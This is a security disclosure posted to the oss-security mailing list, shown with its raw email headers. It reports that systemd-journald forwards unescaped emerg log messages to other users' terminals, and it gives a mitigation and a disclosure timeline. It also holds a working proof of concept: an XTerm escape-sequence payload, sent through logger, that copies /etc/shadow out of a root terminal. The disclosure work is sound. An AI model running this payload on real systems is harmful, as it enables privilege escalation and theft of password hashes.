Received: (qmail 20158 invoked by uid 550); 8 Apr 2026 00:25:36 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 26343 invoked from network); 8 Apr 2026 00:09:20 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=riseup.net; s=squak;
	t=1775606951; bh=JamLv/iLFjgsdPOXQfBiApdAqEPw57aMDDvKy7KUaKM=;
	h=Date:From:To:Cc:Subject:From;
	b=SG9Y7ftTdEPZx406QsjAgU/K/3xtFCIfABmXIy4yIcl1s52XWXjaW0BBFKXP98gL9
	 lrSI2znpXWBraDsJ+SDAvd//wpUp4K6lPVqdWRDEaOpDXT3mZqN9ub5mO7J8OhEgQJ
	 oDVLkNwVIMd5bdYym7+OYxhVWqg67HxfWLr0KvUE=
X-Riseup-User-ID: 6742F29A4E52E219CCA852BF51CAA7550D5BC643D17F6159801F50303CF955C2
Date: Tue, 7 Apr 2026 20:09:06 -0400
From: Aaron Rainbolt <arraybolt3@riseup.net>
To: oss-security@lists.openwall.com
Cc: adrelanos@whonix.org, arraybolt3@gmail.com
Message-ID: <20260407200906.14b9bcc0@riseup.net>
MIME-Version: 1.0
Content-Type: multipart/signed; boundary="Sig_/H2euY6D9UhYLoyRvXfna2c4";
 protocol="application/pgp-signature"; micalg=pgp-sha512
Subject: [oss-security] systemd-journald in systemd 259 does not escape characters in emerg
 messages that are wall'd to other user's terminals

--Sig_/H2euY6D9UhYLoyRvXfna2c4
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: quoted-printable

Going over this semi-briefly:
=20=20
* systemd-journald is configured with the `ForwardToWall=3Dyes` and
  `MaxWallLevel=3Demerg` settings by default in Ubuntu 26.04 pre-release
  images and Arch Linux. (I think this is because these are enabled by
  default in systemd upstream but haven't tried to verify this.) In my
  testing, this will result in systemd-journald copying emerg-level
  log messages to all logged-in TTYs and at least some root-owned PTYs
  (if any exist).
* Any user on the system can write an emerg-level log message using
  `logger -p emerg 'msg...'`.
* Potentially dangerous character sequences in log messages (like ANSI
  escape sequences) are not sanitized by systemd-journald before it
  prints those messages to other user's terminals.
* Therefore, one can use systemd-journald to write malicious things to
  other people's terminals, which can be used to exploit terminal
  emulator vulnerabilities. There have been vulnerabilities in
  terminal emulators like XTerm in the past that would allow this to
  be used to execute arbitrary code as root if someone is unlucky
  enough to have a PTY to a root shell open in a vulnerable terminal
  when an attacker writes their malicious log message.

An easy proof-of-concept for this (assuming your system has `sudo`
configured to allocate a new PTY) is:

1. Open two terminal windows as a non-root user.
2. In one terminal window, open a root shell by running `sudo -i`.
3. In the other terminal window, run
   `logger -p 'emerg' $'\033[31mHello!\033[0m'` as a non-root user.

You will see a wall message printed in the terminal emulator window
that you ran `sudo -i` in, with the word 'Hello' written in red.

A more involved proof-of-concept that demonstrates how this can be
used to escalate privileges is:

1. Compile a version of XTerm that is vulnerable to CVE-2022-45063.
   (XTerm patch #369 worked for me last time I tried this.)
2. Open two instances of XTerm at once as a non-root user.
3. In one XTerm window, open a root shell by running `sudo -i`.
4. In the other XTerm window, as a non-root user, run
   `pwned=3D$'\e]50;i$(cp /etc/shadow /home/user/shadow && chown user:user =
/home/user/shadow)\a\e]50;?\a\n'`
   (replacing 'user' with your non-root user's username where
   appropriate).
5. In the same non-root XTerm window, run
   `logger -p 'emerg' "$pwned"`. You should now have a copy of the
   system's shadow password file in your home directory, readable by
   your non-root user.

Affected users can mitigate this by setting `ForwardToWall=3Dno` in
systemd-journald's configuration (`/etc/systemd/journald.conf`), or by
adding `systemd.journald.forward_to_wall=3Dno` to their kernel command
line.

I discovered this while doing work for the Kicksecure and Whonix
projects. This bug was reported privately to upstream on December 23,
2025. As per Kicksecure's Vulnerability Disclosure Policy [1], we're
disclosing it publicly on April 7, 2026, 90 days + a 14-day grace
period later. An upstream bug report can be seen at [2].

--
Aaron

[1] https://www.kicksecure.com/wiki/Vulnerability_Disclosure_Policy
[2] https://github.com/systemd/systemd/issues/41549

--Sig_/H2euY6D9UhYLoyRvXfna2c4
Content-Type: application/pgp-signature
Content-Description: OpenPGP digital signature

-----BEGIN PGP SIGNATURE-----

iHUEARYKAB0WIQS8QsiCjFi4DcDBX+Q5rdye4jrrCAUCadWcogAKCRA5rdye4jrr
CEMvAQC3fdNMpN+sRbT2XMoBW3+/iMhqmfLXwxbSePQK/zglbAD/SDm+dqNUxJA3
772ciE+MfGjtG3akoqeBGRKj2jk8QA0=
=Zc3z
-----END PGP SIGNATURE-----

--Sig_/H2euY6D9UhYLoyRvXfna2c4--
